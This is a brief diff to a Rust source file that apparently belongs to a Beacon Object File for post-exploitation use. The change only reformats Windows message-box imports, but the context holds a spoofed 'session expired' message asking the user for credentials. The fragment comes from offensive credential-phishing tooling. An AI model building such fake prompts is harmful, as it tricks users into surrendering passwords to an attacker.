@@ -12,7 +12,9 @@
 
 use rustbof::data::DataParser;
 use rustbof::println;
-use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxA, IDOK, MB_OKCANCEL, MB_ICONWARNING, MB_TOPMOST, MB_SETFOREGROUND};
+use windows_sys::Win32::UI::WindowsAndMessaging::{
+    IDOK, MB_ICONWARNING, MB_OKCANCEL, MB_SETFOREGROUND, MB_TOPMOST, MessageBoxA,
+};
 
 const MESSAGE: &[u8] = b"Your session has expired. Please enter your credentials to continue.\0";
 
